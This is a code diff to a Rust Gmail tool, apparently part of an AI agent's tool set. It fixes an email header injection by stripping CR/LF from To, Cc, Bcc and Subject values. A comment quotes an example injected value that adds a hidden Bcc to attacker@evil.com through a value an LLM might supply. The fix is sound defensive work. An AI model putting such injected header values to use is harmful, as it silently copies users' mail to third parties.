@@ -502,18 +502,31 @@ impl GmailTool {
         bcc: Option<&str>,
     ) -> String {
         let mut raw = String::with_capacity(256 + body.len());
-        raw.push_str(&format!("To: {to}\r\n"));
+        // SEC-tools-extended-003 (SECTASKS T-044): every header value is
+        // caller/LLM supplied and was interpolated verbatim, so
+        // `to="victim@x\r\nBcc: attacker@evil.com"` silently added a recipient.
+        // Strip CR/LF from each header value before formatting.
+        raw.push_str(&format!("To: {}\r\n", strip_crlf(to)));
         if let Some(cc) = cc {
-            raw.push_str(&format!("Cc: {cc}\r\n"));
+            raw.push_str(&format!("Cc: {}\r\n", strip_crlf(cc)));
         }
         if let Some(bcc) = bcc {
-            raw.push_str(&format!("Bcc: {bcc}\r\n"));
+            raw.push_str(&format!("Bcc: {}\r\n", strip_crlf(bcc)));
         }
-        raw.push_str(&format!("Subject: {subject}\r\n"));
+        raw.push_str(&format!("Subject: {}\r\n", strip_crlf(subject)));
         raw.push_str("Content-Type: text/plain; charset=UTF-8\r\n\r\n");
         raw.push_str(body);
         base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(raw.as_bytes())
     }
+}
+
+/// Remove CR and LF from an RFC 2822 header value.
+///
+/// SEC-tools-extended-003 (SECTASKS T-044): a header value containing a CRLF
+/// terminates the header, so an injected `\r\nBcc: ...` would add a recipient
+/// the user never sees. Both bare CR/LF and CRLF pairs are removed.
+fn strip_crlf(value: &str) -> String {
+    value.chars().filter(|c| *c != '\r' && *c != '\n').collect()
 }
 
 impl Default for GmailTool {
